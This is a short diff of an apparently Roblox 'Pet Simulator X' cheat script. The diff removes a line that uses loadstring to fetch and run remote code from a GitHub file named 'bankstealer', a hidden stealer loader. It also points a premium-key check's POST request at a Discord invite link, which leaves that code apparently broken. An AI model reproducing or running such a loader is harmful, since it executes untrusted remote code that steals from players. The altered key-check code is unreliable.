@@ -770,7 +770,6 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -1158,7 +1157,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
+        local dhurl = "https://discord.gg/4y4CZfdJHu"
         local dhheaders = {
             ["content-type"] = "application/json"
         }
